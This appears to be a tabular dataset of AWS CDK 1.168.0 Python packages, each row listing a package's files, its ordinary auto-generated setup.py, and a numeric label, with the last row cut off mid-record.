aws-cdk.aws-cloudwatch-actions-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-cloudwatch-actions@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-cloudwatch-actions"",
    ""version"": ""1.168.0"",
    ""description"": ""Alarm Actions for AWS CloudWatch CDK library"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_cloudwatch_actions"",
        ""aws_cdk.aws_cloudwatch_actions._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_cloudwatch_actions._jsii"": [
            ""aws-cloudwatch-actions@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_cloudwatch_actions"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-applicationautoscaling==1.168.0"",
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-sns==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-codebuild-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-codebuild@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-codebuild"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CodeBuild"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_codebuild"",
        ""aws_cdk.aws_codebuild._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_codebuild._jsii"": [
            ""aws-codebuild@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_codebuild"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.assets==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-codecommit==1.168.0"",
        ""aws-cdk.aws-codestarnotifications==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-ecr-assets==1.168.0"",
        ""aws-cdk.aws-ecr==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-secretsmanager==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-codecommit-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-codecommit@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-codecommit"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CodeCommit"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_codecommit"",
        ""aws_cdk.aws_codecommit._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_codecommit._jsii"": [
            ""aws-codecommit@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_codecommit"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-codestarnotifications==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-codedeploy-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-codedeploy@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-codedeploy"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CodeDeploy"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_codedeploy"",
        ""aws_cdk.aws_codedeploy._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_codedeploy._jsii"": [
            ""aws-codedeploy@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_codedeploy"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-autoscaling==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-ec2==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancing==1.168.0"",
        ""aws-cdk.aws-elasticloadbalancingv2==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-codeguruprofiler-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-codeguruprofiler@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-codeguruprofiler"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CodeGuruProfiler"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_codeguruprofiler"",
        ""aws_cdk.aws_codeguruprofiler._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_codeguruprofiler._jsii"": [
            ""aws-codeguruprofiler@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_codeguruprofiler"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-codepipeline-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-codepipeline@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-codepipeline"",
    ""version"": ""1.168.0"",
    ""description"": ""Better interface to AWS Code Pipeline"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_codepipeline"",
        ""aws_cdk.aws_codepipeline._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_codepipeline._jsii"": [
            ""aws-codepipeline@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_codepipeline"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-codestarnotifications==1.168.0"",
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-codestarnotifications-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-codestarnotifications@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-codestarnotifications"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::CodeStarNotifications"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_codestarnotifications"",
        ""aws_cdk.aws_codestarnotifications._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_codestarnotifications._jsii"": [
            ""aws-codestarnotifications@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_codestarnotifications"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-cognito-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-cognito@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-cognito"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::Cognito"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_cognito"",
        ""aws_cdk.aws_cognito._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_cognito._jsii"": [
            ""aws-cognito@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_cognito"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-certificatemanager==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-dynamodb-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-dynamodb@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-dynamodb"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::DynamoDB"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_dynamodb"",
        ""aws_cdk.aws_dynamodb._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_dynamodb._jsii"": [
            ""aws-dynamodb@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_dynamodb"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-applicationautoscaling==1.168.0"",
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kinesis==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-lambda==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.custom-resources==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-ec2-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-ec2@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-ec2"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::EC2"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_ec2"",
        ""aws_cdk.aws_ec2._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_ec2._jsii"": [
            ""aws-ec2@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_ec2"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-cloudwatch==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.aws-logs==1.168.0"",
        ""aws-cdk.aws-s3-assets==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.aws-ssm==1.168.0"",
        ""aws-cdk.cloud-assembly-schema==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""aws-cdk.region-info==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-ecr-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-ecr@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-ecr"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ECR"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_ecr"",
        ""aws_cdk.aws_ecr._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_ecr._jsii"": [
            ""aws-ecr@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_ecr"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.aws-events==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-kms==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",0
aws-cdk.aws-ecr-assets-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-ecr-assets@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-ecr-assets"",
    ""version"": ""1.168.0"",
    ""description"": ""Docker image assets deployed to ECR"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_ecr_assets"",
        ""aws_cdk.aws_ecr_assets._jsii""
    ],
    ""package_data"": {
        ""aws_cdk.aws_ecr_assets._jsii"": [
            ""aws-ecr-assets@1.168.0.jsii.tgz""
        ],
        ""aws_cdk.aws_ecr_assets"": [
            ""py.typed""
        ]
    },
    ""python_requires"": ""~=3.7"",
    ""install_requires"": [
        ""aws-cdk.assets==1.168.0"",
        ""aws-cdk.aws-ecr==1.168.0"",
        ""aws-cdk.aws-iam==1.168.0"",
        ""aws-cdk.aws-s3==1.168.0"",
        ""aws-cdk.core==1.168.0"",
        ""aws-cdk.cx-api==1.168.0"",
        ""constructs>=3.3.69, <4.0.0"",
        ""jsii>=1.63.2, <2.0.0"",
        ""publication>=0.0.3"",
        ""typeguard~=2.13.3""
    ],
    ""classifiers"": [
        ""Intended Audience :: Developers"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: JavaScript"",
        ""Programming Language :: Python :: 3 :: Only"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Typing :: Typed"",
        ""Development Status :: 5 - Production/Stable"",
        ""License :: OSI Approved"",
        ""Framework :: AWS CDK"",
        ""Framework :: AWS CDK :: 1""
    ],
    ""scripts"": []
}
""""""
)

with open(""README.md"", encoding=""utf8"") as fp:
    kwargs[""long_description""] = fp.read()


setuptools.setup(**kwargs)
",1
aws-cdk.aws-ecs-1.168.0,1,1,1,0,1,0,1,0,LICENSE MANIFEST.in NOTICE PKG-INFO pyproject.toml README.md setup.cfg setup.py py.typed aws-ecs@1.168.0.jsii.tgz __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt,"import json
import setuptools

kwargs = json.loads(
    """"""
{
    ""name"": ""aws-cdk.aws-ecs"",
    ""version"": ""1.168.0"",
    ""description"": ""The CDK Construct Library for AWS::ECS"",
    ""license"": ""Apache-2.0"",
    ""url"": ""https://github.com/aws/aws-cdk"",
    ""long_description_content_type"": ""text/markdown"",
    ""author"": ""Amazon Web Services"",
    ""bdist_wheel"": {
        ""universal"": true
    },
    ""project_urls"": {
        ""Source"": ""https://github.com/aws/aws-cdk.git""
    },
    ""package_dir"": {
        """": ""src""
    },
    ""packages"": [
        ""aws_cdk.aws_ecs"",
